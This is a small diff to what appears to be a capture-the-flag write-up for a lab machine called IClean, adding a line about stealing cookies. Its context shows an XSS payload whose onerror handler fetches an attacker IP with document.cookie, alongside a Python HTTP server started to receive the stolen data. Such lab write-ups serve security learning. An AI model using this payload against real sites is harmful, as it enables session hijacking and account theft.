@@ -130,6 +130,12 @@ Payload -> \<img src=x onerror=fetch("http://10.10.14.13/+document.cookie")\>\</
 
 ![6](../../../assets/images/IClean/6.png)
 
+<br />
+
+SURPRISE! We steal a cookies vault!
+
+<br />
+
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
